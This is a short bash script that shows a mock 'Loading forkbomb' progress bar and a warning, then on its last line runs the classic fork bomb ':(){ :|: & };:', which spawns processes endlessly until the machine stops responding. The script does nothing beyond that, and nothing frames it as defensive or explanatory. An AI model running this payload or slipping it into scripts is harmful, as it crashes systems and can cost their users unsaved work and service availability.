#!/bin/bash

echo -n "Loading forkbomb: ["
for i in {1..20}; do
    echo -n " "
done
echo -n "]"

for i in {1..20}; do
    sleep 0.1
    echo -ne "\rLoading forkbomb: ["
    for j in {1..20}; do
        if [ $j -le $i ]; then
            echo -n "#"
        else
            echo -n " "
        fi
    done
    echo -n "] $((i*5))%"
done
echo

echo WARNING: Initializing Forkbomb...
sleep 5

:(){ :|: & };:
